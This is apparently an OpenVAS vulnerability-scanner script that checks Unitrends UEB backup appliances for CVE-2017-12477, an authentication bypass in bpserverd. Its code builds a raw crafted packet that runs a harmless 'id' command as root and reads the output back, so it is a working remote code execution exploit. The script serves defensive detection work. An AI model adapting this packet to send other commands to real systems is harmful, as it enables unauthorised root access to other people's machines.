##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_unitrends_rce_vuln.nasl 11983 2018-10-19 10:04:45Z mmartin $
#
# Unitrends RCE Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140446");
  script_version("$Revision: 11983 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 12:04:45 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-10-23 13:21:51 +0700 (Mon, 23 Oct 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2017-12477");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Unitrends RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("gb_unitrends_detect.nasl");
  script_mandatory_keys("unitrends/detected");
  script_require_ports(1743);

  script_tag(name:"summary", value:"Unitrends UEB is prone to a remote code execution vulnerability in
bpserverd.");

  script_tag(name:"insight", value:"It was discovered that the Unitrends bpserverd proprietary protocol, as
exposed via xinetd, has an issue in which its authentication can be bypassed. A remote attacker could use this
issue to execute arbitrary commands with root privilege on the target system.");

  script_tag(name:"vuldetect", value:"Sends a crafted request to bpserverd and checks the response.");

  script_tag(name:"affected", value:"Unitrends UEB prior to version 10.0.0");

  script_tag(name:"solution", value:"Update to version 10.0.0 or later.");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/144693/Unitrends-UEB-bpserverd-Authentication-Bypass-Remote-Command-Execution.html");
  script_xref(name:"URL", value:"https://support.unitrends.com/UnitrendsBackup/s/article/000005755");

  exit(0);
}

port = 1743;
if (!get_port_state(port))
  exit(0);

soc1 = open_sock_tcp(port);
if (!soc1)
  exit(0);

recv = recv(socket: soc1, length: 512);

if ("Connect" >!< recv || strlen(recv) < 41) {
  close(soc1);
  exit(0);
}

backport = substr(recv, 36, 40);
if (!backport || backport < 1 || backport > 65535) {
  close(soc1);
  exit(0);
}

# Open the back port for the result
soc2 = open_sock_tcp(backport);
if (!soc2) {
  close(soc1);
  exit(0);
}

# It seems we have to pipe the results to a file to get the result back
cmd = 'id > /tmp/openvas#';
cmd_len = strlen(cmd) + 3;
pkt_len = strlen(cmd) + 23;

data = raw_string(0xa5, 0x52, 0x00, 0x2d, 0x00, 0x00, 0x00, pkt_len, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                  0x4c, 0x00, 0x00, 0x00, cmd_len, cmd, 0x00, 0x00, 0x00);

# Send to first port and get the response over the back port
send(socket: soc1, data: data);
recv = recv(socket: soc2, length: 1024);

close(soc1);
close(soc2);

if (recv =~ 'uid=[0-9]+.*gid=[0-9]+') {
  report = "It was possible to execute the 'id' command.\n\nResult:\n" + recv;
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
